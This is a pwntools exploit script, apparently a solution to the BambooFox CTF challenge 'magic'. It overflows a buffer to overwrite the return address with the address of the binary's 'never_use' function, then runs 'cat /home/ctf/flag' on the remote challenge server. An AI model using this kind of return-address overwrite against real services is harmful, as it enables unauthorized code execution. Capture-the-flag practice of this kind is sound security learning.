from pwn import *

local = False
debug = False
gdb1 = False

elf1 = ELF("./magic")
if debug == True:
    context.loglevel = "debug"
if local == True:
    r = process("./magic")
    if gdb1 == True:
        gdb.attach(r)
else:
    r = remote('bamboofox.cs.nctu.edu.tw', 10000)
    


never_use = elf1.symbols['never_use']

print(r.recvuntil(":"))
r.sendline("a")
print(r.recvuntil(":"))
r.sendline(b"a"+b"\x00"+b"b"*70+p32(never_use+6))
r.sendline("cat /home/ctf/flag")

r.interactive()
